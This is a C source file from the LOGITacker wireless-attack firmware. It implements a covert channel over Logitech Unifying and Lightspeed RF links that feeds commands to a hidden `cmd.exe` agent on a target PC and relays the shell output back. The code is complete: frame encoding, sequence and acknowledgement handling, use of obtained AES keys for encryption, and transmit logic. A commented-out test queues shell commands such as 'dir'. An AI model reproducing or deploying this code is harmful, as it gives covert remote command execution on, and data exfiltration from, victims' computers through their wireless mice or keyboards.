#include "nrf.h"
#include "nrf_queue.h"
#include "logitacker.h"
#include "logitacker_processor_covert_channel.h"
#include "logitacker_processor.h"
#include "helper.h"
#include "string.h"
#include "logitacker_devices.h"
#include "logitacker_unifying.h"
#include "logitacker_options.h"
#include "logitacker_flash.h"

#define NRF_LOG_MODULE_NAME LOGITACKER_PROCESSOR_COVERT_CHANNEL
#include "nrf_log.h"
#include "logitacker_unifying_crypto.h"

NRF_LOG_MODULE_REGISTER();





//Queue for tx_data
NRF_QUEUE_DEF(covert_channel_payload_data_t, m_covert_channel_tx_data_queue, 20, NRF_QUEUE_MODE_NO_OVERFLOW);


/*
 * ToDo - ClientAgent
 * - fix bug, where no proper ACK is sent back if the frame is of CONTROL_TYPE_MAX_PAYLOAD_SIZE
 * - add functionality to restart the child process. The process is currently `cmd.exe` and could be terminated
 * if 'exit' is sent to STDIN. There's still an issue if an interactive child process is started, which doesn't get
 * bound to STDIN.
 * - add option to hide/unhide the parent PS Window
 */


typedef enum {
    COVERT_CHANNEL_PHASE_SYNC,
    COVERT_CHANNEL_PHASE_RUNNING,
    COVERT_CHANNEL_PHASE_STOPPED,
} covert_channel_phase_t;


/*
 * Covert channel data frame
 *
 * offset       Bits    Name                    Usage
 *
 * 0x00         7:0     Device Index            0x00 for outbound frames, device index for inbound frames
 * 0x01         7:0     Report Type             Should always be 0x11 (HID++ 1.0 long)
 * 0x02         7:0     Destination ID          for outbound frames, set according to inbound frames (corresponds to RF address prefix)
 * 0x03         7:1     Marker                  Identifies covert channel data
 *              0:0     Control Frame           If set, the payload represents a control frame
 * 0x04         7:4     Payload Length          IF NOT CONTROL FRAME: Effective length of payload (max value 15 bytes)
 * 0x04         7:4     Control Type            IF CONTROL FRAME: Type of control frame, length depends on type
 * 0x04         3:2     Ack Number              Acknowledgment number (0..3)
 * 0x04         1:0     Seq Number              Sequence Number
 * 0x05..0x15   -       Payload                 Payload (dynamic length between 0 and 15 bytes, 16 bytes for control frames)
 * 0x16         7:0     Logitech CRC            Logitech 8 bit CRC
 *
 *
 * Note:
 * Although the payload array could carry up to 16 bytes, the length field could only encode values between 0 and 15.
 * In order to use the maximum length of 16 bytes, a control frame has to be used (if bit 0 of marker field is set,
 * bit 7:4 are interpreted as control frame type, instead of length).
 * The control frame type of a "maximum payload length" frame is 0x00
 */

typedef enum {
    COVERT_CHANNEL_CONTROL_TYPE_MAXIMUM_PAYLOAD_LENGTH_FRAME = 0x0,
} covert_channel_control_frame_type_t;



typedef struct {
    uint8_t current_tx_seq;
    uint8_t last_rx_seq;
    uint8_t marker;
    uint8_t unifying_device_index;

    uint8_t tx_interval;

    covert_channel_payload_data_t tmp_covert_channel_tx_data;
    covert_channel_payload_data_t tmp_covert_channel_rx_data;

    nrf_esb_payload_t tmp_tx_frame;
    nrf_esb_payload_t tmp_rx_frame;

    uint8_t current_rf_address[5];

    uint8_t rf_base_addr[4];
    uint8_t rf_prefix;

    uint8_t tx_delay_ms;

    bool receiver_in_range;
    covert_channel_phase_t phase;
    app_timer_id_t timer_next_action;

    logitacker_devices_unifying_dongle_t * p_dongle;

    logitacker_devices_unifying_device_t *p_device;

    nrf_cli_t const * p_cli;
} logitacker_processor_covert_channel_ctx_t;

static logitacker_processor_t m_processor = {0};
static logitacker_processor_covert_channel_ctx_t m_static_covert_channel_ctx; //we reuse the same context, alternatively an malloc'ed ctx would allow separate instances

static char addr_str_buff[LOGITACKER_DEVICE_ADDR_STR_LEN] = {0};

void processor_covert_channel_init_func(logitacker_processor_t *p_processor);
void processor_covert_channel_init_func_(logitacker_processor_covert_channel_ctx_t *self);

void processor_covert_channel_deinit_func(logitacker_processor_t *p_processor);
void processor_covert_channel_deinit_func_(logitacker_processor_covert_channel_ctx_t *self);

void processor_covert_channel_esb_handler_func(logitacker_processor_t *p_processor, nrf_esb_evt_t *p_esb_evt);
void processor_covert_channel_esb_handler_func_(logitacker_processor_covert_channel_ctx_t *self, nrf_esb_evt_t *p_esb_event);

void processor_covert_channel_timer_handler_func(logitacker_processor_t *p_processor, void *p_timer_ctx);
void processor_covert_channel_timer_handler_func_(logitacker_processor_covert_channel_ctx_t *self, void *p_timer_ctx);

void processor_covert_channel_bsp_handler_func(logitacker_processor_t *p_processor, bsp_event_t event);
void processor_covert_channel_bsp_handler_func_(logitacker_processor_covert_channel_ctx_t *self, bsp_event_t event);



void processor_covert_channel_update_tx_frame(logitacker_processor_covert_channel_ctx_t *self);
uint32_t processor_covert_channel_process_rx_frame(logitacker_processor_covert_channel_ctx_t *self);

logitacker_processor_t * contruct_processor_covert_channel_instance(logitacker_processor_covert_channel_ctx_t *const covert_channel_ctx) {
    m_processor.p_ctx = covert_channel_ctx;
    m_processor.p_init_func = processor_covert_channel_init_func;
    m_processor.p_deinit_func = processor_covert_channel_deinit_func;
    m_processor.p_esb_handler = processor_covert_channel_esb_handler_func;
    m_processor.p_timer_handler = processor_covert_channel_timer_handler_func;
    m_processor.p_bsp_handler = processor_covert_channel_bsp_handler_func;

    return &m_processor;
}

uint32_t logitacker_processor_covert_channel_push_tx_data(logitacker_processor_t *p_processor_covert_channel, covert_channel_payload_data_t const * p_tx_data) {
    return nrf_queue_push(&m_covert_channel_tx_data_queue, p_tx_data);
}

uint32_t g_series_decrypt_rx_payload(logitacker_processor_covert_channel_ctx_t *self) {
    VERIFY_TRUE(self->p_device != NULL, NRF_ERROR_NOT_SUPPORTED);
    VERIFY_TRUE(self->p_device->key_known, NRF_ERROR_NOT_SUPPORTED);
    VERIFY_TRUE(self->tmp_rx_frame.length == 30, NRF_ERROR_INVALID_LENGTH);
    VERIFY_TRUE((self->tmp_rx_frame.data[1] & 0x1f) == UNIFYING_RF_REPORT_ENCRYPTED_HIDPP_LONG, NRF_ERROR_INVALID_DATA);

    uint8_t tmp_buf[22] = {0};


    if (logitacker_unifying_crypto_decrypt_encrypted_hidpp_frame(tmp_buf, self->p_device->key, &self->tmp_rx_frame) == NRF_SUCCESS) {
        // replace content of RX frame
        memcpy(self->tmp_rx_frame.data, tmp_buf, 22);
        self->tmp_rx_frame.length = 22;
        return NRF_SUCCESS;
    } else {
        return NRF_ERROR_INVALID_DATA;
    }
}

uint32_t g_series_encrypt_tx_payload(logitacker_processor_covert_channel_ctx_t *self) {
    VERIFY_TRUE(self->p_device != NULL, NRF_ERROR_NOT_SUPPORTED);
    VERIFY_TRUE(self->p_device->key_known, NRF_ERROR_NOT_SUPPORTED);
    VERIFY_TRUE(self->tmp_tx_frame.length == 22, NRF_ERROR_INVALID_LENGTH);
    VERIFY_TRUE((self->tmp_tx_frame.data[1] & 0x1f) == UNIFYING_RF_REPORT_HIDPP_LONG, NRF_ERROR_INVALID_DATA);


    uint8_t tmp_buf[22] = {0};
    memcpy(tmp_buf, self->tmp_tx_frame.data, 22);


    if (logitacker_unifying_crypto_encrypt_hidpp_frame(&self->tmp_tx_frame, tmp_buf, self->p_device->key, self->p_device->last_used_aes_ctr) == NRF_SUCCESS) {
        self->p_device->last_used_aes_ctr += 2; // advance counter by 2
        return NRF_SUCCESS;
    } else {
        return NRF_ERROR_INVALID_DATA;
    }
}

void processor_covert_channel_update_tx_frame(logitacker_processor_covert_channel_ctx_t *self) {
/*
 * Covert channel data frame
 *
 * offset       Bits    Name                    Usage
 *
 * 0x00         7:0     Device Index            0x00 for outbound frames, device index for inbound frames
 * 0x01         7:0     Report Type             Should always be 0x11 (HID++ 1.0 long)
 * 0x02         7:0     Destination ID          for outbound frames, set according to inbound frames (corresponds to RF address prefix)
 * 0x03         7:1     Marker                  Identifies covert channel data
 *              0:0     Control Frame           If set, the payload represents a control frame
 * 0x04         7:4     Payload Length          IF NOT CONTROL FRAME: Effective length of payload (max value 15 bytes)
 * 0x04         7:4     Control Type            IF CONTROL FRAME: Type of control frame, length depends on type
 * 0x04         3:2     Ack Number              Acknowledgment number (0..3)
 * 0x04         1:0     Seq Number              Sequence Number
 * 0x05..0x14   -       Payload                 Payload (dynamic length between 0 and 15 bytes, 16 bytes for control frames)
 * 0x15         7:0     Logitech CRC            Logitech 8 bit CRC
 *
 *
 * Note:
 * Although the payload array could carry up to 16 bytes, the length field could only encode values between 0 and 15.
 * In order to use the maximum length of 16 bytes, a control frame has to be used (if bit 0 of marker field is set,
 * bit 7:4 are interpreted as control frame type, instead of length).
 * The control frame type of a "maximum payload length" frame is 0x00
 */

    self->tmp_tx_frame.length = 22;

    self->tmp_tx_frame.data[0x00] = 0x00;
    self->tmp_tx_frame.data[0x01] = 0x11 | 0x40; //HID++ 1.0 long with keep-alive bit set
    self->tmp_tx_frame.data[0x02] = self->rf_prefix; //destination id == rf_prefix
    self->tmp_tx_frame.data[0x03] = self->marker; // mark as covert channel frame
    if (self->tmp_covert_channel_tx_data.len >= 16) {
        self->tmp_tx_frame.data[0x03] = self->marker | 0x01; //update covert channel marker, to represent a control frame
        // set control type
        self->tmp_tx_frame.data[0x04] = COVERT_CHANNEL_CONTROL_TYPE_MAXIMUM_PAYLOAD_LENGTH_FRAME << 4;
        //copy in data
        memcpy(&self->tmp_tx_frame.data[0x05], self->tmp_covert_channel_tx_data.data, 16);
    } else {
        //encode length
        self->tmp_tx_frame.data[0x04] = self->tmp_covert_channel_tx_data.len << 4;
        // copy in data
        memcpy(&self->tmp_tx_frame.data[0x05], self->tmp_covert_channel_tx_data.data, self->tmp_covert_channel_tx_data.len);
    }

    // encode SEQ/ACK no
    uint8_t tx_ack = (self->last_rx_seq & 0x03);
    uint8_t tx_seq = (self->current_tx_seq & 0x03);
    self->tmp_tx_frame.data[0x04] |= (tx_seq | (tx_ack << 2));

    NRF_LOG_DEBUG("TX SEQ         0x%02x", tx_seq);
    NRF_LOG_DEBUG("TX ACK         0x%02x", tx_ack);


    //update logitech crc
    logitacker_unifying_payload_update_checksum(self->tmp_tx_frame.data, self->tmp_tx_frame.length);

    self->tmp_tx_frame.pipe = 1;
    self->tmp_tx_frame.noack = false; // we need an ack
}

uint32_t processor_covert_channel_process_rx_frame(logitacker_processor_covert_channel_ctx_t *self) {
/*
 * Covert channel data frame
 *
 * offset       Bits    Name                    Usage
 *
 * 0x00         7:0     Device Index            0x00 for outbound frames, device index for inbound frames
 * 0x01         7:0     Report Type             Should always be 0x11 (HID++ 1.0 long)
 * 0x02         7:0     Destination ID          for outbound frames, set according to inbound frames (corresponds to RF address prefix)
 * 0x03         7:1     Marker                  Identifies covert channel data
 *              0:0     Control Frame           If set, the payload represents a control frame
 * 0x04         7:4     Payload Length          IF NOT CONTROL FRAME: Effective length of payload (max value 15 bytes)
 * 0x04         7:4     Control Type            IF CONTROL FRAME: Type of control frame, length depends on type
 * 0x04         3:2     Ack Number              Acknowledgment number (0..3)
 * 0x04         1:0     Seq Number              Sequence Number
 * 0x05..0x14   -       Payload                 Payload (dynamic length between 0 and 15 bytes, 16 bytes for control frames)
 * 0x15         7:0     Logitech CRC            Logitech 8 bit CRC
 *
 *
 * Note:
 * Although the payload array could carry up to 16 bytes, the length field could only encode values between 0 and 15.
 * In order to use the maximum length of 16 bytes, a control frame has to be used (if bit 0 of marker field is set,
 * bit 7:4 are interpreted as control frame type, instead of length).
 * The control frame type of a "maximum payload length" frame is 0x00
 */

    NRF_LOG_DEBUG("RX rf prefix 0x%02x", self->tmp_rx_frame.data[0x02]);
    NRF_LOG_DEBUG("RX marker    0x%02x", self->tmp_rx_frame.data[0x03]);
    NRF_LOG_DEBUG("RX len       %d", self->tmp_rx_frame.length);

    VERIFY_TRUE(self->tmp_rx_frame.length == 22, NRF_ERROR_INVALID_LENGTH);
    VERIFY_TRUE(self->tmp_rx_frame.data[0x01] == 0x11, NRF_ERROR_INVALID_DATA);
    VERIFY_TRUE((self->tmp_rx_frame.data[0x03] & 0xFE) == self->marker, NRF_ERROR_INVALID_DATA);


    //ToDo: check Logitech CRC

    self->unifying_device_index = self->tmp_rx_frame.data[0x00];

    //extract SEQ/ACK
    uint8_t rx_seq = self->tmp_rx_frame.data[0x04] & 0x03;
    uint8_t rx_ack = (self->tmp_rx_frame.data[0x04] >> 2) & 0x03;

    NRF_LOG_DEBUG("RX SEQ         0x%02x", rx_seq);
    NRF_LOG_DEBUG("RX ACK         0x%02x", rx_ack);


    //if phase is sync, the SEQ and ACK are updated according to received frame
    if (self->phase == COVERT_CHANNEL_PHASE_SYNC) {
        //align tx seq to received ACK
        self->current_tx_seq = (rx_ack + 1) & 0x03;
        self->last_rx_seq = rx_seq;
        self->phase = COVERT_CHANNEL_PHASE_RUNNING;
        processor_covert_channel_update_tx_frame(self);
        return NRF_SUCCESS;
    }


    // process the frame data only, if the SEQ number is the successor of the previous one
    uint8_t expected_seq = (self->last_rx_seq + 1) & 0x03;
    if (rx_seq == expected_seq) {
        NRF_LOG_DEBUG("Frame with new SEQ arrived")

        //update RX sequence no
        self->last_rx_seq = rx_seq;

        bool is_control_type = (self->tmp_rx_frame.data[0x03] & 0x01) > 0x00;
        if (is_control_type) {
            uint8_t control_type = (self->tmp_rx_frame.data[0x04] & 0xF0) >> 4;
            switch (control_type) {
                case COVERT_CHANNEL_CONTROL_TYPE_MAXIMUM_PAYLOAD_LENGTH_FRAME:
                    // interpret payload as 16 byte data
                    self->tmp_covert_channel_rx_data.len = 16;
                    memcpy(self->tmp_covert_channel_rx_data.data, &self->tmp_rx_frame.data[0x05], 16);
                    break;
                default:
                    // ignore invalid CONTROL TYPES
                    NRF_LOG_WARNING("Unknown control frame type 0x%02x", control_type);
                    break;
            }
        } else {
            // extract payload data according to encoded length
            uint8_t data_length = (self->tmp_rx_frame.data[0x04] & 0xF0) >> 4;
            memcpy(self->tmp_covert_channel_rx_data.data, &self->tmp_rx_frame.data[0x05], data_length);
            self->tmp_covert_channel_rx_data.len = data_length;
        }

        if (self->tmp_covert_channel_rx_data.len > 0) {
            //NRF_LOG_INFO("NEW RX data:")
            if (self->p_cli != NULL) {
                // generate 0 terminated string and do formatted print
                char tmpstr[17] = {0};
                memcpy(tmpstr, self->tmp_covert_channel_rx_data.data, self->tmp_covert_channel_rx_data.len);
                nrf_cli_fprintf(self->p_cli, NRF_CLI_DEFAULT, "%s", tmpstr);
            } else {
                NRF_LOG_HEXDUMP_INFO(self->tmp_covert_channel_rx_data.data, self->tmp_covert_channel_rx_data.len);
            }

        }
    }

    // check if last TX frame was acknowledged, if yes, new data could be TX'ed
    if (rx_ack == self->current_tx_seq) {
        NRF_LOG_DEBUG("Last TX seq was ACK'ed ... updating TX data");

        //dequeue next payload
        if (nrf_queue_pop(&m_covert_channel_tx_data_queue, &self->tmp_covert_channel_tx_data) != NRF_SUCCESS) {
            // if here, no element was popped from queue, set tx_data len to 0
            self->tmp_covert_channel_tx_data.len = 0;
            NRF_LOG_DEBUG("no data on queue");
        }

        //advance TX seq
        self->current_tx_seq++;
        self->current_tx_seq &= 0x03;
    }

    //update TX frame
    processor_covert_channel_update_tx_frame(self);

    return NRF_SUCCESS;
}

void processor_covert_channel_bsp_handler_func(logitacker_processor_t *p_processor, bsp_event_t event) {
    processor_covert_channel_bsp_handler_func_((logitacker_processor_covert_channel_ctx_t *) p_processor->p_ctx, event);
}

void processor_covert_channel_bsp_handler_func_(logitacker_processor_covert_channel_ctx_t *self, bsp_event_t event) {

}

void processor_covert_channel_init_func(logitacker_processor_t *p_processor) {
    processor_covert_channel_init_func_((logitacker_processor_covert_channel_ctx_t *) p_processor->p_ctx);
}

void processor_covert_channel_init_func_(logitacker_processor_covert_channel_ctx_t *self) {
    if (g_logitacker_global_config.workmode == OPTION_LOGITACKER_WORKMODE_UNIFYING) {
        self->tx_delay_ms = COVERT_CHANNEL_TX_DELAY_MS_UNIFYING;
    } else {
        self->tx_delay_ms = COVERT_CHANNEL_TX_DELAY_MS_G900_G700;
    }



    helper_addr_to_base_and_prefix(self->rf_base_addr, &self->rf_prefix, self->current_rf_address, LOGITACKER_DEVICE_ADDR_LEN);

    helper_addr_to_hex_str(addr_str_buff, LOGITACKER_DEVICE_ADDR_LEN, self->current_rf_address);
    NRF_LOG_INFO("Start covert channel for address %s", addr_str_buff);

    radio_disable_rx_timeout_event(); // disable RX timeouts
    radio_stop_channel_hopping(); // disable channel hopping
    nrf_esb_stop_rx(); //stop rx in case running

    // set current address for pipe 1
    nrf_esb_enable_pipes(0x00); //disable all pipes
    nrf_esb_set_base_address_1(self->rf_base_addr); // set base addr1
    nrf_esb_update_prefix(1, self->rf_prefix); // set prefix and enable pipe 1


    // clear TX/RX payload buffers (just to be sure)
    memset(&self->tmp_tx_frame, 0, sizeof(self->tmp_tx_frame)); //unset TX payload
    memset(&self->tmp_rx_frame, 0, sizeof(self->tmp_rx_frame)); //unset RX payload
    memset(&self->tmp_covert_channel_tx_data, 0, sizeof(self->tmp_covert_channel_tx_data)); //unset TX data
    memset(&self->tmp_covert_channel_rx_data, 0, sizeof(self->tmp_covert_channel_rx_data)); //unset TX data

    self->p_dongle = NULL;

    //clear tx data
    memset(self->tmp_covert_channel_tx_data.data, 0, 16);
    self->tmp_covert_channel_tx_data.len = 0;

    // clear tx data queue
    nrf_queue_reset(&m_covert_channel_tx_data_queue);

    /*
    //enqueue test data for TX
    covert_channel_payload_data_t test = {0};
    memcpy(test.data, "dir\n", 4);
    test.len = 4;
    nrf_queue_push(&m_covert_channel_tx_data_queue, &test);
    memcpy(test.data, "dir2\n", 5);
    test.len = 5;
    nrf_queue_push(&m_covert_channel_tx_data_queue, &test);
    */

    // update marker
    self->marker = COVERT_CHANNEL_DATA_MARKER & 0xfe; //assure base marker hasn't bit 0 set

    // update TX ESB frame
    self->tmp_tx_frame.noack = false; // we want ack payloads for all our transmissions
    processor_covert_channel_update_tx_frame(self);

    self->phase = COVERT_CHANNEL_PHASE_SYNC;
    self->current_tx_seq = 0;
    self->last_rx_seq = 0;

    // setup radio as PTX
    nrf_esb_set_mode(NRF_ESB_MODE_PTX);
    switch (g_logitacker_global_config.workmode) {
        case OPTION_LOGITACKER_WORKMODE_LIGHTSPEED:
            nrf_esb_update_channel_frequency_table_lightspeed();
            break;
        case OPTION_LOGITACKER_WORKMODE_UNIFYING:
            nrf_esb_update_channel_frequency_table_unifying();
            break;
        case OPTION_LOGITACKER_WORKMODE_G700:
            nrf_esb_update_channel_frequency_table_unifying();
            break;
    }

    nrf_esb_enable_all_channel_tx_failover(true); //retransmit payloads on all channels if transmission fails
    nrf_esb_set_all_channel_tx_failover_loop_count(2); //iterate over channels two time before failing
    nrf_esb_set_retransmit_count(2);
    nrf_esb_set_retransmit_delay(250);
    nrf_esb_set_tx_power(NRF_ESB_TX_POWER_8DBM); // full power TX

    // encrypt payload if LIGHTSPEED
    if (g_logitacker_global_config.workmode == OPTION_LOGITACKER_WORKMODE_LIGHTSPEED) {
        g_series_encrypt_tx_payload(self);
    }
    // write payload (autostart TX is enabled for PTX mode)
    nrf_esb_write_payload(&self->tmp_tx_frame);
}

void processor_covert_channel_deinit_func(logitacker_processor_t *p_processor) {
    processor_covert_channel_deinit_func_((logitacker_processor_covert_channel_ctx_t *) p_processor->p_ctx);
}

void processor_covert_channel_deinit_func_(logitacker_processor_covert_channel_ctx_t *self) {
    NRF_LOG_INFO("DEINIT covert channel for address %s", addr_str_buff);

    radio_disable_rx_timeout_event(); // disable RX timeouts
    radio_stop_channel_hopping(); // disable channel hopping
    nrf_esb_stop_rx(); //stop rx in case running

    nrf_esb_set_mode(NRF_ESB_MODE_PRX); //should disable and end up in idle state

    // set current address for pipe 1
    nrf_esb_enable_pipes(0x00); //disable all pipes

    self->phase = COVERT_CHANNEL_PHASE_STOPPED;

    // reset inner loop count
    self->rf_prefix = 0x00; //unset prefix
    memset(self->rf_base_addr, 0, 4); //unset base address
    memset(self->current_rf_address, 0, 5); //unset RF address

    memset(&self->tmp_tx_frame, 0, sizeof(self->tmp_tx_frame)); //unset TX payload
    memset(&self->tmp_rx_frame, 0, sizeof(self->tmp_rx_frame)); //unset RX payload

    nrf_esb_enable_all_channel_tx_failover(false); // disable all channel failover
}

void processor_covert_channel_timer_handler_func(logitacker_processor_t *p_processor, void *p_timer_ctx) {
    processor_covert_channel_timer_handler_func_((logitacker_processor_covert_channel_ctx_t *) p_processor->p_ctx, p_timer_ctx);
}

void processor_covert_channel_timer_handler_func_(logitacker_processor_covert_channel_ctx_t *self, void *p_timer_ctx) {
    // encrypt payload if LIGHTSPEED
    if (g_logitacker_global_config.workmode == OPTION_LOGITACKER_WORKMODE_LIGHTSPEED) {
        g_series_encrypt_tx_payload(self);
    }

    NRF_LOG_DEBUG("TX FRAME");
    NRF_LOG_HEXDUMP_DEBUG(self->tmp_tx_frame.data, self->tmp_tx_frame.length);

    // transmit current TX payload
    if (nrf_esb_write_payload(&self->tmp_tx_frame) != NRF_SUCCESS) {
        NRF_LOG_WARNING("Error writing payload");
    }

}

void processor_covert_channel_esb_handler_func(logitacker_processor_t *p_processor, nrf_esb_evt_t *p_esb_evt) {
    processor_covert_channel_esb_handler_func_((logitacker_processor_covert_channel_ctx_t *) p_processor->p_ctx, p_esb_evt);
}

void processor_covert_channel_esb_handler_func_(logitacker_processor_covert_channel_ctx_t *self, nrf_esb_evt_t *p_esb_event) {
    uint32_t channel_freq;
    nrf_esb_get_rf_frequency(&channel_freq);

    switch (p_esb_event->evt_id) {
        case NRF_ESB_EVENT_TX_FAILED:
            NRF_LOG_INFO("COVERT CHANNEL TX_FAIL ... re-transmit");
            // retransmit
            nrf_esb_start_tx();
            break;
        case NRF_ESB_EVENT_TX_SUCCESS_ACK_PAY:
        case NRF_ESB_EVENT_TX_SUCCESS:
        {
            NRF_LOG_DEBUG("COVERT CHANNEL TX_SUCCESS channel: %d", channel_freq);
            NRF_LOG_HEXDUMP_DEBUG(self->tmp_tx_frame.data, self->tmp_tx_frame.length);


            if (p_esb_event->evt_id == NRF_ESB_EVENT_TX_SUCCESS_ACK_PAY) {
                NRF_LOG_DEBUG("ACK_PAY received");

                while (nrf_esb_read_rx_payload(&self->tmp_rx_frame) == NRF_SUCCESS) {
                    // decrypt payload if LIGHTSPEED
                    if (g_logitacker_global_config.workmode == OPTION_LOGITACKER_WORKMODE_LIGHTSPEED) {
                        g_series_decrypt_rx_payload(self);
                    }


                    NRF_LOG_DEBUG("RX FRAME")
                    NRF_LOG_HEXDUMP_DEBUG(self->tmp_rx_frame.data, self->tmp_rx_frame.length);
                    uint32_t err = processor_covert_channel_process_rx_frame(self);
                    if (err != NRF_SUCCESS) {
                        // this happens during normal operation (non covert channel frames), so it is logged for DEBUG only
                        NRF_LOG_DEBUG("Error processing inbound payload: 0x%08x", err);
                    }

                }
            }

            // retransmit or transmit updated frame
            NRF_LOG_DEBUG("COVERT CHANNEL continue TX in %d ms...", self->tx_delay_ms);
            app_timer_start(self->timer_next_action, APP_TIMER_TICKS(self->tx_delay_ms), self->timer_next_action);
            break;
        }
        case NRF_ESB_EVENT_RX_RECEIVED:
        {
            NRF_LOG_WARNING("ESB EVENT HANDLER COVERT_CHANNEL RX_RECEIVED ... !!shouldn't happen!!");
            break;
        }
    }
}



logitacker_processor_t * new_processor_covert_channel(uint8_t *rf_address, app_timer_id_t timer_next_action, nrf_cli_t const * p_cli) {
    // initialize context (static in this case, has to use malloc for new instances)
    logitacker_processor_covert_channel_ctx_t *const p_ctx = &m_static_covert_channel_ctx;
    memset(p_ctx, 0, sizeof(*p_ctx)); //replace with malloc for dedicated instance

    //initialize member variables
    memcpy(p_ctx->current_rf_address, rf_address, 5);
    p_ctx->timer_next_action = timer_next_action;
    p_ctx->p_cli = p_cli;

    // try to retrieve device
    logitacker_devices_get_device(&p_ctx->p_device, p_ctx->current_rf_address);


    return contruct_processor_covert_channel_instance(&m_static_covert_channel_ctx);
}